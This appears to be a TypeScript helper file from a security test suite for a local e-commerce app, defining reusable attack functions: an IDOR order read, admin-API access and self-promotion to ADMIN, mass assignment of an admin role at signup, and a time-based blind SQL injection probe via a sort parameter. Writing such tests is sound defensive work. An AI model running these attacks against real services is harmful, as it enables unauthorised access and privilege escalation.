import { api } from "../helpers.js";

// Reusable attacks for the broken-access-control + blind-SQLi cluster.

// Log in and return the cookies + CSRF token for authenticated attacks.
export async function loginAs(email: string, password: string) {
  const res = await fetch(`${process.env.KARTLY_URL ?? "http://localhost:4000"}/api/auth/login`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email, password }),
  });
  const setCookie = res.headers.getSetCookie?.() ?? [];
  const cookie = setCookie.map((c) => c.split(";")[0]).join("; ");
  const csrfMatch = cookie.match(/kartly_csrf=([^;]+)/);
  const body = (await res.json()) as { csrfToken?: string };
  return { cookie, csrf: body.csrfToken ?? (csrfMatch ? csrfMatch[1] : "") };
}

function authed(cookie: string, csrf?: string) {
  const h: Record<string, string> = { Cookie: cookie };
  if (csrf) h["X-CSRF-Token"] = csrf;
  return h;
}

// #5 IDOR: read someone else's order by id.
export async function readOrderAs(cookie: string, orderId: string) {
  return api("GET", `/api/orders/${orderId}`, { headers: authed(cookie) });
}

// #6 privesc: hit the admin API as a non-admin, and self-promote.
export async function listUsersAsNonAdmin(cookie: string) {
  return api("GET", "/api/admin/users", { headers: authed(cookie) });
}
export async function selfPromote(cookie: string, csrf: string, userId: string) {
  return api("POST", `/api/admin/users/${userId}/role`, {
    headers: authed(cookie, csrf),
    body: { role: "ADMIN" },
  });
}

// #7 mass assignment: register injecting role=ADMIN.
export async function registerWithRole(email: string, role: string) {
  return api("POST", "/api/auth/register", {
    body: { email, password: "password123", name: "Mallory", role },
  });
}

// #3 blind SQLi: time-based probe via the sort parameter.
export async function timedSortProbe(sort: string): Promise<number> {
  const start = Date.now();
  await api("GET", `/api/products?sort=${encodeURIComponent(sort)}`);
  return Date.now() - start;
}
